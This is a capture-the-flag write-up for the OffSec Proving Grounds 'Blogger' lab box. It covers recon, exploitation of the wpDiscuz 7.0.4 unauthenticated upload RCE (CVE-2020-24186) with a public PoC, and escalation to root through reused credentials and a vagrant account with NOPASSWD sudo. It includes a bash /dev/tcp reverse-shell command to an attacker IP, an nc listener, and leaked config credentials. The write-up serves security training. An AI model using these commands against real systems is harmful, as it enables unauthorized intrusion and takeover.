---
title: "Blogger"
description: "OffSec Proving Grounds Blogger — WordPress 4.9.8 running wpDiscuz 7.0.4 lets an unauthenticated attacker upload a PHP file disguised as an image for RCE, then vagrant's passwordless sudo is root."
tags:
  - Proving Grounds
  - OffSec
  - Web
  - WordPress
  - Medium
---

# Blogger

**Box info:** Difficulty: Medium · OS: Linux (Ubuntu 16.04, Xenial) · Focus: WordPress plugin RCE (wpDiscuz 7.0.4, CVE-2020-24186), credential/database pivoting, trivial sudo privilege escalation.

A WordPress site tucked under a non-standard path is fingerprinted, its outdated comment plugin is matched to a known unauthenticated RCE, and the resulting `www-data` shell leads to database credentials, a `vagrant` user with full passwordless sudo, and root.

---

## 1. Reconnaissance (nmap)

A full TCP port scan shows a small, web-focused attack surface:

```bash
nmap -p- -T4 -Pn -sV -oA nmap_full_scan 192.168.138.217
```

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
```

Only SSH and HTTP are open, and there are no credentials for SSH, so the HTTP service is the only way in.

## 2. Enumeration

### Content discovery

```bash
ffuf -u "http://192.168.138.217/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r
```

```text
assets                  [Status: 200]
css                     [Status: 200]
images                  [Status: 200]
js                      [Status: 200]
server-status           [Status: 403]
```

Nothing obviously interesting at the webroot, but Apache's directory listing is enabled, so the `assets` tree is worth walking manually rather than only fuzzing from the root:

![Index of /assets/fonts showing a hidden blog/ subdirectory](images/blogger/image-1.png)

A `blog/` folder sits buried under `assets/fonts/` — an unusual, deliberately-obscured path for the actual application:

![The WordPress site living at /assets/fonts/blog/](images/blogger/image-2.png)

!!! info "Why directory listing matters here"
    Apache's `Options +Indexes` turns every directory without an `index.*` file into a browsable file listing. A WordPress install hidden under an unrelated path (`/assets/fonts/blog/`) is "security through obscurity" — it requires no authentication, so once the obscuring path is found, nothing else protects it. The misconfigured `Indexes` directive is precisely what breaks that obscurity: fuzzing the webroot alone found only top-level folders like `assets`, but browsing that already-discovered directory by hand revealed the nested, otherwise-unlinked `blog/` application underneath it.

### Fingerprinting the CMS

`cmseek` and `wpscan` both confirm the stack and surface a version old enough to matter:

```bash
wpscan --url http://blogger.pg/assets/fonts/blog/ --enumerate --api-token <token>
```

```text
[+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).
[+] Upload directory has listing enabled
[+] WordPress theme in use: poseidon
```

An aggressive plugin scan takes over 30 minutes but pays off — it finds a plugin far more dangerous than the outdated core itself:

```bash
sudo wpscan --url http://192.168.138.217/assets/fonts/blog --plugins-detection aggressive
```

```text
[+] wpdiscuz
 | Version: 7.0.4 (80% confidence)
```

`wpDiscuz` 7.0.4 is vulnerable to **CVE-2020-24186** — an unauthenticated arbitrary file upload in the comment form's image-upload handler that leads to remote code execution. A WordPress user enumeration and password brute-force against `wp-admin`/XML-RPC were tried first and went nowhere, and a known exploit for the `poseidon` theme also failed, so the plugin vulnerability was the way in.

![GitHub PoC for the wpDiscuz 7.0.4 unauthenticated RCE](images/blogger/image-5.png)

!!! info "Why the plugin, not the core, was the real target"
    WordPress core fingerprinting (version, theme) tells you where to *stop* looking: a 2018 core release with no known pre-auth RCE is not, by itself, an entry point. Plugins are where most real-world WordPress compromises happen, because they are written by third parties with far less security scrutiny than core, are rarely updated once installed, and run with the exact same filesystem/PHP privileges as the rest of the site. An "aggressive" `wpscan` plugin scan brute-forces plugin slugs/version strings against the site instead of relying on passive page signatures — it is slow (30+ minutes here) precisely because it is checking far more candidates, but it is what surfaced `wpdiscuz`, a comment/discussion plugin that had no business accepting unauthenticated file uploads the way it turned out to.

## 3. Foothold — wpDiscuz unauthenticated RCE (CVE-2020-24186)

The public PoC abuses wpDiscuz's comment-image upload: it swaps the MIME type validation so a PHP payload is accepted as an "image" and dropped into `wp-content/uploads/`, where Apache will still execute it.

```bash
git clone https://github.com/carlosalbertotuma/wpDiscuz-7.0.4-PoC-RCE.git
cd wpDiscuz-7.0.4-PoC-RCE
python3 wpdiscuz_rce.py -u http://blogger.pg/assets/fonts/blog/ -p "/?p=1" --cmd "id"
```

```text
[+] wmuSecurity: 65b24b7eb3
[+] wc_post_id: 1
[+] Shell uploaded: http://blogger.pg/assets/fonts/blog/wp-content/uploads/2026/06/jcqwshhdew-1782113024.8162.php
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### How the wpDiscuz upload RCE works

wpDiscuz lets visitors attach an image to a comment without logging in — a deliberate feature, since comment forms are meant to be usable by anonymous visitors. That upload handler is where CVE-2020-24186 lives.

- **The vulnerability class.** This is an **unauthenticated arbitrary file upload**, directly reachable by anyone who can load the page with the comment form — no WordPress account, no admin session, no CSRF bypass required. Arbitrary file upload turns into remote code execution the moment two conditions hold: (a) the uploaded file lands somewhere the web server will treat as executable code, and (b) the file itself can contain code the server understands (here, PHP).
- **The root cause.** The plugin's handler is only supposed to accept image MIME types (`image/jpeg`, `image/png`, etc.). The PoC works by manipulating how the upload's content type is reported to the server-side check, so the validation inspects an attacker-controlled value — a declared MIME type or crafted multipart field — instead of verifying the actual decoded file content. A request can therefore claim to be an image while the file written to disk has a `.php` extension and PHP source as its body. This is a textbook **insufficient MIME/type validation** flaw — trusting client-supplied metadata for a security decision — the same root cause behind most file-upload bypass bugs, regardless of the framework involved.
- **Why it gives `www-data`.** WordPress's `wp-content/uploads/` directory is served directly by Apache and, on a default or unhardened install, has no `.htaccess` rule disabling PHP execution inside it. Once the malicious `.php` file is written there, simply requesting its URL causes Apache (via `mod_php`) to execute it with the privileges of the web server process — `www-data` — exactly as it would execute any legitimate WordPress file. The PoC automates two steps: (1) a crafted multipart upload that gets the payload onto disk, parsing the JSON response for the generated filename, then (2) a request to that uploaded file's URL with a `cmd`-style parameter, which the uploaded PHP stub uses to shell out and execute attacker-supplied commands.

Confirmed command execution as `www-data`, so the same script delivers a full reverse shell:

```bash
python3 wpdiscuz_rce.py -u http://blogger.pg/assets/fonts/blog/ -p "/?p=1" \
  --cmd "bash -c 'bash -i >& /dev/tcp/192.168.45.207/9001 0>&1'"
```

```bash
nc -lvnp 9001
```

```text
connect to [192.168.45.207] from (UNKNOWN) [192.168.138.217] 55640
python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@ubuntu-xenial:/var/www/wordpress/assets/fonts/blog/wp-content/uploads/2026/06$
```

### User flag

```bash
cd /home/james
cat local.txt
```

```text
<LOCAL_REDACTED>
```

## 4. Privilege escalation

With a stable `www-data` shell, `wp-config.php` yields the database root password in plaintext:

```bash
cat wp-config.php
```

```text
define('DB_NAME', 'wordpress');
define('DB_USER', 'root');
define('DB_PASSWORD', 'sup3r_s3cr3t');
```

### Why credentials in `wp-config.php` matter

`wp-config.php` is the one file every WordPress install needs in plaintext at runtime — PHP has no built-in secure secret store, so the database username, password, host, and WordPress's internal secret keys all sit in a file readable by whatever user the webserver runs as. That is an accepted risk *as long as* only the webserver process can read the file. The danger appears the moment another foothold — here, the `www-data` shell gained from the RCE — can also read arbitrary files on disk: the "runtime secret" instantly becomes an "attacker-readable secret." Database credentials are also frequently **reused** across local accounts, which is exactly the pivot attempted next; even when a leaked DB password is not directly reusable for shell access, it still hands over the application's entire dataset — user table, password hashes, private content — for free.

That password is reused for the local MySQL/MariaDB `root` account, which confirms database access but doesn't directly hand over a shell as the application only stores a hashed WordPress login. Since local `su` attempts against `james`, `ubuntu`, and `root` all fail with guessed/known values, the home directories are checked for any other account:

```bash
su vagrant
# Password: vagrant
```

```text
vagrant@ubuntu-xenial:/home$
id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
```

`vagrant` is a default low-value account on Vagrant-provisioned boxes, and it is almost always configured with blanket sudo rights for convenience — exactly what `sudo -l` confirms:

```bash
sudo -l
```

```text
User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL
```

### How `NOPASSWD: ALL` sudo becomes root

`sudo -l` lists what the current user is permitted to run under `sudo`, and `(ALL) NOPASSWD: ALL` is the least restrictive entry the sudoers syntax supports:

- `(ALL)` — the rule applies when running as *any* target user, including `root`.
- `ALL` (the command field) — *any* command, with no path and no argument restriction.
- `NOPASSWD:` — sudo does not re-prompt for the invoking user's own password before honoring the rule.

Put together, this is not a restricted privilege at all — it is unconditional root access gated by nothing but already being logged in as `vagrant`. This configuration exists on Vagrant boxes by design, so provisioning scripts can run privileged setup commands without an interactive password prompt; it is meant to be stripped before a box goes anywhere near production, and on this target it was not. Any command run through `sudo` here — `sudo su`, `sudo bash`, `sudo id` — executes as `root` with no further checks.

## 5. Root / proof.txt

Passwordless, unrestricted sudo is a direct path to a root shell:

```bash
sudo su
```

```text
root@ubuntu-xenial:/home/vagrant# cat /root/proof.txt
<PROOF_REDACTED>
```

---

## Takeaway

A directory-listing misconfiguration surfaced a WordPress install deliberately hidden under an unrelated path, and version fingerprinting of a single plugin (not the WordPress core) found the real way in: wpDiscuz's unauthenticated file-upload RCE. From there, a plaintext database password in `wp-config.php` and a leftover `vagrant` account with `NOPASSWD: ALL` sudo turned a web shell into root with almost no extra effort — a reminder that default provisioning accounts are frequently the weakest link once any shell is obtained.
